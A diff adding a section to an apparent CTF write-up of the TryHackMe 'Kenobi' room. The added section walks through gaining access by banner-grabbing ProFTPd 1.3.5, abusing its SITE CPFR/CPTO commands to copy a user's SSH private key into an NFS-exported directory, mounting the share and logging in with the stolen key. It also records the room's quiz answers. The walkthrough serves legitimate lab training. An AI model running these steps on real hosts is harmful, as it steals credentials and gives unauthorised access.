@@ -63,6 +63,48 @@ What mount can we see?
 
 Answer-```/var```
 
+# Task 3 Gain initial access with ProFtpd
+
+  using nc to connect to the machine on port 21
+
+  ```nc 10.10.152.93 21```
+
+  What is the version?
+
+  Answer-```1.3.5```
+
+  Using Searchsploit to find particular software version exploits
+
+  How many exploits are there for the ProFTPd running?
+
+  Answer-```3```
+
+We're now going to copy Kenobi's private key using SITE CPFR and SITE CPTO commands. This is done as we have access to /var.
+
+```SITE CPFR /home/kenobi/.ssh/id_rsa```
+
+```SITE CPTO /var/tmp/id_rsa```
+
+Lets mount the /var/tmp directory to our machine
+
+```mkdir /mnt/kenobiNFS```
+
+```mount 10.10.152.93:/var /mnt/kenobiNFS  ```
+
+```ls -la /mnt/kenobiNFS```
+
+With the network mount on our machine, we can then go to /var/tmp to retrieve the private key
+
+```cp /mnt/kenobiNFS/tmp/id_rsa . ```
+
+next we need t set permissions for rw and execute,
+
+```sudo chmod 600 id_rsa```
+
+```ssh kenobi@10.10.152.93 -i id_rsa```
+
+
+
 
 
 
